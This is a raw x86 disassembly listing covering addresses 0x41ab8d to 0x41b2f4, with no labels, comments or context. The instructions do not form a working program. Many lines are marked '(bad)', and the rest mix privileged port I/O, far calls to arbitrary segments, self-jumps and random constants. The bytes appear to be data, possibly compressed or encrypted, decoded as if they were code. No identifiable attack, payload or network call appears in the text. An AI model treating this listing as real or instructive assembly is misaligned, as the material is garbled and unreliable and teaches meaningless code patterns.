  41ab8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab8e:	sub    al,0xdb
  41ab90:	ins    DWORD PTR es:[di],dx
  41ab92:	inc    ecx
  41ab93:	push   esi
  41ab94:	hlt    
  41ab95:	fwait
  41ab96:	add    DWORD PTR [esi+0x1a6da69c],esp
  41ab9c:	mov    al,0x71
  41ab9e:	in     al,dx
  41ab9f:	mov    bh,0xac
  41aba1:	outs   dx,DWORD PTR ds:[esi]
  41aba2:	pop    ds
  41aba3:	and    BYTE PTR [eax+0x24],bh
  41aba6:	and    DWORD PTR [eax+0x47],ebp
  41aba9:	and    cl,al
  41abab:	jae    0x41abab
  41abad:	stc    
  41abae:	mov    ecx,DWORD PTR [edx]
  41abb0:	loop   0x41ab7d
  41abb2:	inc    edx
  41abb3:	mov    dh,0xb
  41abb5:	inc    ebx
  41abb6:	ss and ebp,ebp
  41abb9:	jmp    0x2c388e28
  41abbe:	and    eax,0xe9407b1d
  41abc3:	aad    0x6a
  41abc5:	mov    edx,0x41713574
  41abca:	mov    edi,0xd6c78b51
  41abcf:	lahf   
  41abd0:	shl    ecx,cl
  41abd2:	in     eax,0xdd
  41abd4:	cmp    DWORD PTR [esi-0x54],ebx
  41abd7:	and    eax,0x71b6a1cd
  41abdc:	add    DWORD PTR [eax+0x33],0xfffffff3
  41abe0:	(bad)  
  41abe1:	xor    DWORD PTR [esi+0x62985888],eax
  41abe7:	or     BYTE PTR [edx-0x77020fd1],bh
  41abed:	push   ds
  41abee:	(bad)  
  41abef:	stos   DWORD PTR es:[edi],eax
  41abf0:	mov    BYTE PTR [ecx+0x6],ah
  41abf3:	les    ebp,FWORD PTR [eax]
  41abf5:	fldenv [edx+eiz*2]
  41abf9:	fist   WORD PTR [eax+0x6850bc90]
  41abff:	push   ebp
  41ac00:	lea    edx,[ebp-0x5ddd428]
  41ac06:	xor    bl,BYTE PTR [eax]
  41ac08:	fwait
  41ac09:	(bad)  
  41ac0a:	icebp  
  41ac0b:	int    0xcf
  41ac0d:	dec    ecx
  41ac0e:	push   eax
  41ac0f:	xor    DWORD PTR [ebx],ebx
  41ac11:	sub    bh,BYTE PTR [esi+eax*1+0x1442201e]
  41ac18:	dec    ecx
  41ac19:	or     BYTE PTR [edi],0xc
  41ac1c:	fidivr DWORD PTR [edx+0x40e08370]
  41ac22:	sbb    BYTE PTR [esi+0x60],0xf1
  41ac26:	xor    eax,0x9805641b
  41ac2b:	pop    ebx
  41ac2c:	mov    esp,0x88029188
  41ac31:	stc    
  41ac32:	xchg   esi,eax
  41ac33:	nop
  41ac34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac35:	aad    0x1
  41ac37:	jl     0x41ac49
  41ac39:	sbb    BYTE PTR [ecx+0x75e334a0],bl
  41ac3f:	rcr    ebp,cl
  41ac41:	sti    
  41ac42:	sub    edx,ebp
  41ac44:	cwde   
  41ac45:	nop    ebp
  41ac48:	dec    esi
  41ac49:	outs   dx,BYTE PTR ds:[esi]
  41ac4a:	jmp    0x41acc7
  41ac4c:	mov    ds:0x99f3a599,al
  41ac51:	sbb    al,0xed
  41ac54:	ficomp WORD PTR [ebp-0xcec9def]
  41ac5a:	xchg   edx,eax
  41ac5b:	fidiv  WORD PTR [ecx-0x5e]
  41ac5e:	inc    esp
  41ac5f:	pop    ebp
  41ac60:	and    DWORD PTR [ecx+0x6f],ebp
  41ac63:	das    
  41ac64:	test   eax,0x65284bf7
  41ac69:	xor    DWORD PTR [ecx+0x617c25ea],ecx
  41ac6f:	shr    BYTE PTR [esi],1
  41ac71:	push   edx
  41ac72:	retf   0x22fa
  41ac75:	and    al,0xcf
  41ac77:	out    0x28,eax
  41ac79:	mov    ah,dl
  41ac7b:	xor    bl,BYTE PTR ds:0xa61f70c2
  41ac81:	sbb    BYTE PTR [edi+0x405cdae9],cl
  41ac87:	xlat   BYTE PTR ds:[ebx]
  41ac88:	retf   0x6ed3
  41ac8b:	fisttp WORD PTR [ecx]
  41ac8d:	in     al,dx
  41ac8e:	adc    al,0xd1
  41ac90:	sbb    eax,0x54108ef3
  41ac95:	pop    edx
  41ac96:	rcr    DWORD PTR [edx],1
  41ac98:	fst    st(0)
  41ac9a:	jmp    0x41acfb
  41ac9c:	out    dx,eax
  41ac9d:	fdivrp st(6),st
  41ac9f:	dec    edi
  41aca0:	fisubr WORD PTR [edx-0x678d19d0]
  41aca6:	xchg   DWORD PTR [edx],eax
  41aca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aca9:	lahf   
  41acaa:	lahf   
  41acab:	dec    ebp
  41acac:	dec    ebx
  41acad:	and    esi,DWORD PTR [esi+0x58]
  41acb0:	mov    dl,0x1b
  41acb2:	push   es
  41acb3:	mov    edi,0xf469e03f
  41acb8:	mov    fs,esi
  41acba:	lods   eax,DWORD PTR ds:[esi]
  41acbb:	int3   
  41acbc:	sbb    DWORD PTR [ecx+0x9a0909],ebp
  41acc2:	sbb    edi,DWORD PTR [eax+0x18cbc6a0]
  41acc8:	inc    ebp
  41acc9:	ja     0x41accb
  41accb:	dec    ebx
  41accc:	push   0xffffffc6
  41acce:	test   BYTE PTR [edx],al
  41acd0:	mov    cl,0xcd
  41acd2:	add    cl,cl
  41acd4:	cli    
  41acd5:	imul   edx,ebp,0xd324975d
  41acdb:	rol    BYTE PTR [edx],0x14
  41acde:	jbe    0x41aca8
  41ace0:	outs   dx,BYTE PTR ds:[esi]
  41ace1:	punpckhdq mm4,QWORD PTR ds:0x70dfe1e5
  41ace8:	push   0x2e
  41acea:	in     eax,0x28
  41acec:	cli    
  41aced:	jecxz  0x41ac8c
  41acef:	in     eax,0xa5
  41acf1:	and    al,0x20
  41acf3:	push   ecx
  41acf4:	sub    BYTE PTR [edx-0x33e609e6],al
  41acfa:	add    ebp,DWORD PTR [ebx+0x27]
  41acfd:	sbb    DWORD PTR [ecx],edi
  41acff:	xchg   esp,eax
  41ad00:	loop   0x41ad48
  41ad02:	dec    edx
  41ad03:	pusha  
  41ad04:	add    BYTE PTR [ebp+0x32],ah
  41ad07:	es xchg ebp,eax
  41ad09:	cld    
  41ad0a:	sub    esp,DWORD PTR [ecx]
  41ad0c:	mov    al,ds:0xa12f83ea
  41ad12:	mov    ds:0xbe92a245,eax
  41ad17:	enter  0xe377,0x24
  41ad1b:	pop    edi
  41ad1c:	mov    dl,ch
  41ad1e:	inc    esp
  41ad1f:	xor    al,0xd9
  41ad21:	test   al,0x1b
  41ad23:	arpl   WORD PTR gs:[edx+0x5f],di
  41ad27:	(bad)  
  41ad28:	loop   0x41ad84
  41ad2a:	adc    cl,BYTE PTR [ecx]
  41ad2c:	or     al,0xb
  41ad2e:	loope  0x41ad8f
  41ad30:	sub    cl,BYTE PTR [edx]
  41ad32:	mov    ebp,0xcdf47bc
  41ad37:	or     BYTE PTR [ecx+0x41e0a05e],ah
  41ad3d:	add    BYTE PTR [eax],bl
  41ad3f:	mov    ds:0xdc684a06,eax
  41ad44:	out    0x4a,al
  41ad46:	xor    edi,DWORD PTR [ebp+0x77804b25]
  41ad4c:	dec    eax
  41ad4d:	pop    ds
  41ad4e:	or     DWORD PTR [ecx+0x5b],esp
  41ad51:	popa   
  41ad52:	jno    0x41ad8c
  41ad54:	pushf  
  41ad55:	jmp    0x27490586
  41ad5a:	scas   al,BYTE PTR es:[edi]
  41ad5b:	mov    cl,0x66
  41ad5d:	mov    ds:0x6a948aaa,al
  41ad62:	mov    ebx,DWORD PTR [ebx]
  41ad64:	dec    edi
  41ad65:	or     al,0x12
  41ad67:	mov    edx,0x23971aa3
  41ad6c:	pop    eax
  41ad6d:	idiv   DWORD PTR [ebx+edi*1]
  41ad70:	scas   eax,DWORD PTR es:[edi]
  41ad71:	arpl   WORD PTR [edx+esi*4],bp
  41ad74:	sbb    eax,ebp
  41ad76:	push   esp
  41ad77:	lds    esi,FWORD PTR [ebp+0x54]
  41ad7a:	jmp    0x209aa9c2
  41ad7f:	cmp    al,0x2e
  41ad81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad82:	pusha  
  41ad83:	mov    esi,edx
  41ad85:	js     0x41ad7a
  41ad87:	ja     0x41ad8f
  41ad89:	mov    DWORD PTR [eax+0x53],esp
  41ad8c:	bound  ebp,QWORD PTR [edi+0x5132f1e5]
  41ad92:	hlt    
  41ad93:	mov    esp,0x6fda046a
  41ad98:	aad    0x41
  41ad9a:	pop    esp
  41ad9b:	mov    DWORD PTR [eax],edi
  41ad9d:	sub    cl,dl
  41ad9f:	xchg   BYTE PTR [eax-0x28eca7e8],cl
  41ada5:	mov    al,0x47
  41ada7:	jmp    0x41ae21
  41ada9:	iret   
  41adaa:	and    bl,BYTE PTR [edx+0x3cc91159]
  41adb0:	nop
  41adb1:	mov    dh,0x1c
  41adb3:	adc    ah,BYTE PTR [ebp-0x6a7dc829]
  41adb9:	lahf   
  41adba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adbb:	pop    ecx
  41adbc:	jge    0x41ad4c
  41adbe:	cmp    DWORD PTR [eax+0x2b40ef6f],edx
  41adc4:	mov    cl,0xe1
  41adc7:	inc    eax
  41adc8:	mov    esp,0x636e3e50
  41adcd:	(bad)  
  41adcf:	imul   eax,DWORD PTR [ebp-0x7d],0x3f993365
  41add6:	pop    es
  41add7:	push   es
  41add8:	pop    esi
  41add9:	mov    ebx,0x6f8b9e0e
  41adde:	and    BYTE PTR [esi],cl
  41ade0:	dec    edi
  41ade1:	push   0x5a
  41ade3:	xor    ch,dl
  41ade5:	(bad)  
  41ade6:	push   ss
  41ade7:	out    dx,eax
  41ade8:	ja     0x41ada4
  41adea:	fdivr  QWORD PTR [edx]
  41adec:	repz xor DWORD PTR ds:0x3cd39509,ebp
  41adf3:	xchg   ebp,eax
  41adf4:	jge    0x41ae75
  41adf6:	retf   0xd1c9
  41adf9:	mov    esp,DWORD PTR [eax+0xc1946bf]
  41adff:	gs add edi,ebx
  41ae02:	fdivr  QWORD PTR [edi+edi*8]
  41ae05:	push   cs
  41ae06:	(bad)  
  41ae07:	ficomp DWORD PTR [ebx]
  41ae09:	dec    edi
  41ae0a:	std    
  41ae0b:	js     0x41ae49
  41ae0d:	adc    DWORD PTR [eax-0x3c7dc7f7],edx
  41ae13:	(bad)  
  41ae14:	and    BYTE PTR [esi],cl
  41ae16:	into   
  41ae17:	mov    edx,0x81555188
  41ae1c:	xor    al,0xbe
  41ae1e:	icebp  
  41ae1f:	add    BYTE PTR [edx-0x20],ch
  41ae22:	pop    edi
  41ae23:	mov    ebp,0xdc09c41
  41ae28:	xor    eax,0x634dde06
  41ae2d:	daa    
  41ae2e:	mov    ds:0x93336b68,al
  41ae33:	imul   ebx,edi,0xffffffed
  41ae36:	push   ebx
  41ae37:	sbb    BYTE PTR [edi],0x24
  41ae3a:	ficom  WORD PTR [eax]
  41ae3c:	inc    edx
  41ae3d:	or     ecx,DWORD PTR [edx-0x23]
  41ae40:	pop    esi
  41ae41:	test   eax,0x9ffe9fc5
  41ae46:	xlat   BYTE PTR ds:[ebx]
  41ae47:	mov    dl,0x9f
  41ae49:	jae    0x41ae95
  41ae4b:	loopne 0x41aea2
  41ae4d:	aas    
  41ae4e:	lods   al,BYTE PTR ds:[esi]
  41ae4f:	cmp    DWORD PTR [eax+0x32],eax
  41ae52:	retf   0xee83
  41ae55:	sahf   
  41ae56:	test   DWORD PTR [edi],edi
  41ae58:	dec    ecx
  41ae59:	push   0x30a64ac7
  41ae5e:	fild   DWORD PTR [esi+edi*1]
  41ae61:	mov    edi,DWORD PTR [ebx]
  41ae63:	cmp    eax,0x2e46f055
  41ae68:	ror    DWORD PTR [edi],1
  41ae6a:	cmp    al,0x63
  41ae6c:	sub    dl,al
  41ae6e:	mov    esi,0x3002b2e1
  41ae73:	test   DWORD PTR [ecx],esp
  41ae75:	push   ebx
  41ae76:	lock xrelease xor BYTE PTR [ecx-0x27b193a7],dl
  41ae7e:	iret   
  41ae7f:	in     eax,0x43
  41ae81:	jg     0x41ae03
  41ae83:	adc    BYTE PTR [ebp-0x40],cl
  41ae86:	xchg   ebx,ecx
  41ae88:	add    dh,BYTE PTR [eax]
  41ae8a:	cwde   
  41ae8b:	jae    0x41aeb5
  41ae8d:	pop    edx
  41ae8e:	cmp    ecx,ebx
  41ae90:	and    al,0x74
  41ae92:	and    edx,esi
  41ae94:	mov    cl,0x68
  41ae96:	jge    0x41ae53
  41ae98:	or     DWORD PTR [edx*1-0x3885ed18],ebp
  41ae9f:	ret    0xbb16
  41aea2:	or     BYTE PTR [edi-0x3224f4c8],bh
  41aea8:	inc    ebx
  41aea9:	ins    DWORD PTR es:[edi],dx
  41aeaa:	je     0x41aee2
  41aeac:	inc    esp
  41aead:	pop    ss
  41aeae:	cmc    
  41aeaf:	cmp    BYTE PTR [edx],dl
  41aeb1:	sub    eax,0x3ecfd962
  41aeb6:	aad    0x43
  41aeb8:	sbb    dh,dh
  41aeba:	data16 das 
  41aebc:	adc    al,BYTE PTR [esi]
  41aebe:	or     eax,0x9575d093
  41aec3:	stos   BYTE PTR es:[edi],al
  41aec4:	outs   dx,BYTE PTR ds:[esi]
  41aec5:	repnz adc ch,bl
  41aec8:	mov    esi,0xcd83db34
  41aecd:	sub    BYTE PTR [ecx-0x6d],al
  41aed0:	mov    bh,0xad
  41aed2:	sbb    eax,0xc75cd5ee
  41aed7:	in     al,0xaa
  41aed9:	dec    edx
  41aeda:	inc    eax
  41aedb:	imul   ebx,DWORD PTR [edi-0x7b4d6647],0x9c15895
  41aee5:	nop
  41aee6:	xor    edi,ebp
  41aee8:	(bad)  
  41aee9:	leave  
  41aeea:	bound  edx,QWORD PTR [ebx*4+0x79b8705a]
  41aef1:	mov    bl,0x3b
  41aef3:	in     al,dx
  41aef4:	fistp  WORD PTR [ecx-0xe]
  41aef7:	sub    DWORD PTR [ecx+edx*2-0x746f881],eax
  41aefe:	mov    bh,bl
  41af00:	jge    0x41ae89
  41af02:	sub    eax,0xac7ae80
  41af07:	or     ebp,DWORD PTR [edx]
  41af09:	xchg   edi,eax
  41af0a:	int    0x69
  41af0c:	cwde   
  41af0d:	mov    edi,0x47d5e22f
  41af12:	or     DWORD PTR [edx-0x764e59be],ecx
  41af18:	int3   
  41af19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af1a:	addr16 and dl,ch
  41af1d:	cmp    cl,BYTE PTR [esi+0x22]
  41af20:	lahf   
  41af21:	pop    ss
  41af22:	adc    bl,dl
  41af24:	lods   al,BYTE PTR ds:[esi]
  41af25:	pop    esi
  41af26:	in     eax,0xc8
  41af28:	in     eax,dx
  41af29:	push   eax
  41af2a:	add    DWORD PTR [ebp+0x75bbdc63],edi
  41af30:	mov    esp,0x1cc7619f
  41af35:	push   es
  41af36:	cld    
  41af37:	rcl    BYTE PTR [esi],1
  41af39:	aas    
  41af3a:	repz adc cl,BYTE PTR [ebp+0x17]
  41af3e:	xchg   BYTE PTR [esi+ebp*4],ch
  41af41:	fsub   st(5),st
  41af43:	and    BYTE PTR [ebx],0x87
  41af46:	pop    ds
  41af47:	push   0xb57cb2e2
  41af4c:	es pop edi
  41af4e:	out    0xe3,al
  41af50:	outs   dx,DWORD PTR ds:[esi]
  41af51:	cmp    eax,0x8fdf5973
  41af56:	jge    0x41af70
  41af58:	std    
  41af59:	(bad)  
  41af5b:	and    DWORD PTR [esi+0x0],esi
  41af5e:	lea    ebx,[ebx+ecx*2-0x3612f1c]
  41af65:	sar    DWORD PTR [ebx+0x3c],0x9f
  41af69:	or     ebx,DWORD PTR [eax]
  41af6b:	pusha  
  41af6c:	cdq    
  41af6d:	cmp    esi,DWORD PTR [edx]
  41af6f:	pusha  
  41af70:	scas   al,BYTE PTR es:[edi]
  41af71:	mov    DWORD PTR [ecx+0x4ddccb37],edx
  41af77:	aam    0x8b
  41af79:	repnz sub al,0xbe
  41af7c:	dec    ecx
  41af7d:	mov    al,0xcb
  41af7f:	imul   ebx,ebp,0x72
  41af82:	(bad)  [edx+esi*4]
  41af85:	pop    ebx
  41af86:	mov    dh,0x48
  41af88:	fiadd  DWORD PTR [ebx+edi*2+0x353c5330]
  41af8f:	in     al,0x62
  41af91:	jg     0x41b007
  41af93:	sub    BYTE PTR [edx-0xb677ec3],ah
  41af99:	jmp    0x39a12851
  41af9e:	jbe    0x41b002
  41afa0:	mov    ch,0x16
  41afa2:	bound  ebx,QWORD PTR [esi-0x9]
  41afa5:	scas   al,BYTE PTR es:[edi]
  41afa6:	sub    ah,BYTE PTR [edx+ebx*8-0x19]
  41afaa:	sub    al,0xce
  41afac:	pop    es
  41afad:	jmp    0x41af6c
  41afaf:	mov    dl,0x87
  41afb1:	in     eax,0xb
  41afb3:	aad    0xc1
  41afb5:	cmp    al,0xd8
  41afb7:	push   es
  41afb8:	loop   0x41afb8
  41afba:	or     al,0xd1
  41afbc:	fst    DWORD PTR [edi]
  41afbe:	popf   
  41afbf:	cmp    eax,0x6b71ad02
  41afc4:	adc    ah,dl
  41afc6:	pop    ss
  41afc7:	push   es
  41afc8:	scas   eax,DWORD PTR es:[edi]
  41afc9:	scas   eax,DWORD PTR es:[edi]
  41afca:	pushf  
  41afcb:	pop    esi
  41afcc:	cmp    DWORD PTR [ebx],esi
  41afce:	hlt    
  41afcf:	cmp    eax,0xed78258
  41afd4:	mov    ebp,0x142d462f
  41afd9:	push   esp
  41afda:	call   0x15b0:0x84f25c34
  41afe1:	cmp    al,0xea
  41afe3:	mov    ah,0x9d
  41afe5:	shr    BYTE PTR [eax-0x106d722c],1
  41afeb:	and    eax,0xe353fd24
  41aff0:	mov    ebx,0xb81d0c89
  41aff5:	rcl    BYTE PTR [edx+0x8e841bf],0xda
  41affc:	jmp    0x41afe9
  41affe:	int3   
  41afff:	sub    edi,ebx
  41b001:	lock mov al,0xf3
  41b004:	fdiv   QWORD PTR ds:0xcfb7c8e9
  41b00a:	jbe    0x41afe3
  41b00c:	fsub   DWORD PTR [ebx+0x55a86d31]
  41b012:	cmc    
  41b013:	retf   0xf9c6
  41b016:	and    esp,DWORD PTR [ebp+ecx*8+0x1096c0e2]
  41b01d:	sub    dl,bl
  41b01f:	xor    BYTE PTR [edi+0x74],dl
  41b022:	push   0x68
  41b024:	cmp    cl,dh
  41b026:	jmp    DWORD PTR [eax-0x69]
  41b029:	arpl   WORD PTR [edi],dx
  41b02b:	rol    DWORD PTR [ecx-0x697a7de1],cl
  41b031:	or     ch,BYTE PTR ds:0x3992ad4a
  41b037:	gs das 
  41b039:	cli    
  41b03a:	mov    DWORD PTR [ebx+0x40],edx
  41b03d:	jecxz  0x41b0bb
  41b03f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b040:	add    esi,DWORD PTR [ebx-0x6092a5ee]
  41b046:	push   0xffffffb1
  41b048:	mov    cl,0x90
  41b04a:	daa    
  41b04b:	push   ebx
  41b04c:	nop
  41b04d:	xchg   esp,eax
  41b04e:	inc    esi
  41b04f:	cmp    al,ah
  41b051:	in     eax,dx
  41b052:	in     al,0xcd
  41b054:	fwait
  41b055:	inc    edx
  41b056:	fmulp  st(2),st
  41b058:	mov    ds:0xcbc9e4b5,al
  41b05d:	mov    ds:0xbf3356c1,eax
  41b062:	(bad)
  41b066:	arpl   WORD PTR [esi+0xc8e3328],si
  41b06c:	stos   BYTE PTR es:[edi],al
  41b06d:	inc    ecx
  41b06e:	or     eax,DWORD PTR [ebp+0x45]
  41b071:	pop    es
  41b072:	(bad)  
  41b073:	xor    DWORD PTR [edx-0x684b7db0],0x1c
  41b07a:	push   edx
  41b07b:	jno    0x41b07b
  41b07d:	mov    dl,0x9c
  41b07f:	and    ecx,ecx
  41b081:	lea    edx,[ebp+0x28a0c1e6]
  41b087:	mov    ch,0xd2
  41b089:	or     eax,0x29da5100
  41b08e:	stos   BYTE PTR es:[edi],al
  41b08f:	sti    
  41b090:	inc    ebx
  41b091:	add    eax,0xb11f7370
  41b096:	adc    eax,0xbe5c03e0
  41b09b:	dec    eax
  41b09c:	retf   0x8b3e
  41b09f:	pop    ss
  41b0a0:	sti    
  41b0a1:	mov    esi,0xa8c03301
  41b0a6:	mov    ds:0x9eb684d6,al
  41b0ab:	mov    al,ds:0xce822ee3
  41b0b0:	test   al,0xb5
  41b0b2:	sbb    dh,al
  41b0b4:	push   esi
  41b0b5:	mov    dl,0xb1
  41b0b7:	cmp    ah,ah
  41b0b9:	add    ah,BYTE PTR [eax+0x7a493cba]
  41b0bf:	pop    ebp
  41b0c0:	retf   0xbf43
  41b0c3:	ret    
  41b0c4:	mov    ch,0xc3
  41b0c6:	stos   BYTE PTR es:[edi],al
  41b0c7:	push   cs
  41b0c8:	aam    0x8d
  41b0ca:	sub    al,dh
  41b0cc:	in     al,dx
  41b0cd:	mov    dl,0xcf
  41b0cf:	dec    edi
  41b0d0:	icebp  
  41b0d1:	mov    DWORD PTR [edi-0x10],eax
  41b0d4:	and    al,0x7e
  41b0d6:	loopne 0x41b074
  41b0d8:	jnp    0x41b060
  41b0da:	mov    ds:0x7182d871,eax
  41b0df:	mov    dh,0xbe
  41b0e1:	aas    
  41b0e2:	push   edx
  41b0e3:	and    dl,BYTE PTR [esi+0x6e2fda49]
  41b0e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0ea:	cdq    
  41b0eb:	ret    
  41b0ec:	xchg   esi,eax
  41b0ed:	dec    ebp
  41b0ee:	cdq    
  41b0ef:	push   cs
  41b0f0:	mov    ss:0x47d276ed,al
  41b0f6:	test   BYTE PTR [eax],cl
  41b0f8:	nop
  41b0f9:	fistp  QWORD PTR [eax]
  41b0fb:	sbb    ebp,ebx
  41b0fd:	jbe    0x41b13e
  41b0ff:	add    al,0xd2
  41b101:	popf   
  41b102:	call   0xcf65:0x684b961a
  41b109:	stos   DWORD PTR es:[edi],eax
  41b10a:	into   
  41b10b:	dec    ebp
  41b10c:	sbb    ebx,ebx
  41b10e:	mov    BYTE PTR [ecx],bh
  41b110:	ins    DWORD PTR es:[edi],dx
  41b111:	call   0x10def2b4
  41b116:	(bad)  
  41b118:	xchg   ebp,eax
  41b119:	push   eax
  41b11a:	xor    ecx,esi
  41b11c:	jmp    0x888b:0xf4fa7231
  41b123:	add    al,0xed
  41b125:	scas   al,BYTE PTR es:[edi]
  41b126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b127:	or     dh,BYTE PTR es:[eax-0x16]
  41b12b:	inc    edx
  41b12c:	push   ecx
  41b12d:	shr    DWORD PTR ds:0x90c5d001,cl
  41b133:	pop    edi
  41b134:	cwde   
  41b135:	push   edx
  41b136:	loop   0x41b0e6
  41b138:	dec    edx
  41b139:	xchg   esi,eax
  41b13a:	adc    BYTE PTR [eax+0x19],bh
  41b13d:	xor    al,BYTE PTR [esi+0x3b]
  41b140:	or     eax,0x989794ab
  41b145:	adc    BYTE PTR [esi],0x55
  41b148:	xchg   esp,eax
  41b149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b14a:	js     0x41b155
  41b14c:	call   0xddaf:0x3060929
  41b153:	mov    cl,0xdf
  41b155:	dec    eax
  41b156:	out    0x4e,eax
  41b158:	fst    DWORD PTR [ecx-0x4f]
  41b15b:	sub    esp,eax
  41b15d:	cmp    al,0x88
  41b160:	sub    esi,DWORD PTR [esi]
  41b162:	popf   
  41b163:	pop    eax
  41b164:	fs pop edx
  41b166:	mov    dl,0x15
  41b168:	mov    eax,0x5c6c656d
  41b16d:	aas    
  41b16e:	add    eax,0xbadb61f2
  41b173:	pop    ds
  41b174:	xchg   edi,eax
  41b175:	mov    BYTE PTR [ecx],ah
  41b177:	fidiv  WORD PTR [esp+edx*4+0x4d6e1369]
  41b17e:	stc    
  41b17f:	add    DWORD PTR [ebx-0x6b],eax
  41b182:	or     eax,0xdcf390b2
  41b187:	out    0xbb,al
  41b189:	inc    edi
  41b18a:	mov    al,0x80
  41b18c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b18d:	ficomp DWORD PTR [ecx+0x3b]
  41b190:	or     eax,0xa9fa7992
  41b195:	sub    ch,BYTE PTR [ecx-0x195c98b2]
  41b19b:	pop    ds
  41b19c:	adc    DWORD PTR [eax],esi
  41b19e:	(bad)  
  41b19f:	pushf  
  41b1a0:	push   0xffffffe6
  41b1a2:	sbb    BYTE PTR [edi-0x6d],dh
  41b1a5:	push   cs
  41b1a6:	outs   dx,DWORD PTR ds:[esi]
  41b1a7:	les    edi,FWORD PTR [edi]
  41b1a9:	mov    WORD PTR [ebp-0x2d],?
  41b1ac:	cdq    
  41b1ad:	or     BYTE PTR ds:0xab1763b7,bh
  41b1b3:	xor    BYTE PTR [edi],bh
  41b1b5:	scas   eax,DWORD PTR es:[edi]
  41b1b6:	pop    eax
  41b1b7:	hlt    
  41b1b8:	sbb    al,0x2a
  41b1ba:	repz fsubrp st(6),st
  41b1bd:	push   ds
  41b1be:	dec    ebp
  41b1bf:	cmp    esp,esp
  41b1c1:	popa   
  41b1c2:	push   ss
  41b1c3:	(bad)
  41b1c6:	test   BYTE PTR [ecx+0x24],ch
  41b1c9:	push   ebp
  41b1ca:	mov    esp,0x946e3e1a
  41b1cf:	cld    
  41b1d0:	mov    eax,ds:0xedf29fac
  41b1d5:	js     0x41b251
  41b1d7:	sub    eax,0xa39c6272
  41b1dc:	in     eax,0xdf
  41b1de:	jp     0x41b166
  41b1e0:	add    eax,0xf24c3cfc
  41b1e5:	jmp    0xc55ffb51
  41b1ea:	cld    
  41b1eb:	js     0x41b1fe
  41b1ed:	xchg   edi,eax
  41b1ee:	mov    dl,0x28
  41b1f0:	and    BYTE PTR [ecx-0x20],bh
  41b1f3:	adc    DWORD PTR [edx+ebp*4+0x48796b2a],ebx
  41b1fa:	xchg   ebx,eax
  41b1fb:	inc    edx
  41b1fc:	ins    DWORD PTR es:[edi],dx
  41b1fd:	mov    bh,0x74
  41b1ff:	cmp    BYTE PTR [edx+0x16684b39],bh
  41b205:	pop    esi
  41b206:	mov    ebp,0xa201c63b
  41b20b:	mov    ds:0x8d03183a,al
  41b210:	pop    esi
  41b211:	stc    
  41b212:	pop    ss
  41b213:	jmp    DWORD PTR [ebp-0x6f]
  41b216:	gs push ebp
  41b218:	inc    edi
  41b219:	inc    esp
  41b21a:	cs pop esp
  41b21c:	xor    eax,0x1e51952f
  41b221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b222:	push   es
  41b223:	or     bl,bh
  41b225:	pop    ecx
  41b226:	adc    eax,0x40a28c1d
  41b22b:	cs pop ebx
  41b22d:	sbb    DWORD PTR [edi],0x212c105e
  41b233:	or     dh,BYTE PTR [edi+edi*2]
  41b236:	push   cs
  41b237:	rol    dh,0x91
  41b23a:	in     eax,dx
  41b23b:	sub    eax,0xa29e12eb
  41b240:	cwde   
  41b241:	jmp    0x41b297
  41b243:	into   
  41b244:	ins    DWORD PTR es:[edi],dx
  41b245:	test   BYTE PTR [eax+0x6e339080],ah
  41b24b:	scas   al,BYTE PTR es:[edi]
  41b24c:	mov    ecx,0x2a2e8c66
  41b251:	xchg   ebx,eax
  41b252:	push   0xe1cb692a
  41b257:	mov    al,ds:0x5a113cc2
  41b25c:	mov    ah,BYTE PTR [eax]
  41b25e:	jbe    0x41b293
  41b260:	cmp    DWORD PTR [edi+esi*8-0x15],ecx
  41b264:	test   BYTE PTR ds:0x9bc9ea6c,0x49
  41b26b:	lods   eax,DWORD PTR ds:[esi]
  41b26c:	lahf   
  41b26d:	repnz mov dl,0xb3
  41b270:	push   edi
  41b271:	jbe    0x41b203
  41b273:	pop    ebx
  41b274:	add    dh,BYTE PTR [esi-0x13193aac]
  41b27a:	ds movs BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41b27d:	jmp    0x41b2b8
  41b27f:	pop    es
  41b280:	stos   BYTE PTR es:[edi],al
  41b281:	mov    esp,0x66aee57f
  41b286:	imul   eax,DWORD PTR [ebp+0x45],0xf51e8a09
  41b28d:	pop    ebx
  41b28e:	dec    esp
  41b28f:	imul   ebx,DWORD PTR [esi-0x44028750],0x66fd8364
  41b299:	jns    0x41b278
  41b29b:	test   DWORD PTR [eax+0x60],eax
  41b29e:	in     eax,dx
  41b29f:	xchg   ebx,eax
  41b2a0:	retf   0xd6a8
  41b2a3:	gs or  eax,0xfa72b26c
  41b2a9:	pusha  
  41b2aa:	cdq    
  41b2ab:	(bad)  
  41b2ac:	mov    bl,0x12
  41b2ae:	inc    esi
  41b2af:	fcmovnbe st,st(2)
  41b2b1:	sub    al,0xae
  41b2b3:	push   ebx
  41b2b4:	aaa    
  41b2b5:	(bad)  
  41b2b6:	jg     0x41b2ba
  41b2b8:	loope  0x41b255
  41b2ba:	jp     0x41b248
  41b2bc:	mov    cl,0xa9
  41b2be:	retf   0x8baf
  41b2c1:	cmp    DWORD PTR [edx],eax
  41b2c3:	xor    DWORD PTR [ebp-0x2a26fa90],edi
  41b2c9:	(bad)  
  41b2ca:	out    0xd3,al
  41b2cc:	aaa    
  41b2cd:	dec    esi
  41b2ce:	leave  
  41b2cf:	out    dx,eax
  41b2d0:	out    0x1f,eax
  41b2d2:	ds aas 
  41b2d4:	push   esp
  41b2d5:	retf   0xf484
  41b2d8:	add    DWORD PTR [ecx-0x2a7a7c7e],edx
  41b2de:	push   ds
  41b2df:	popa   
  41b2e0:	push   ebx
  41b2e1:	lds    ebx,FWORD PTR [ebp+0x18e178fe]
  41b2e7:	push   cs
  41b2e8:	mov    eax,ds:0x90d016cd
  41b2ed:	bound  edi,QWORD PTR [esi-0x734e11fb]
  41b2f3:	lods   al,BYTE PTR ds:[esi]
  41b2f4:	scas   eax,DWORD PTR es:[edi]
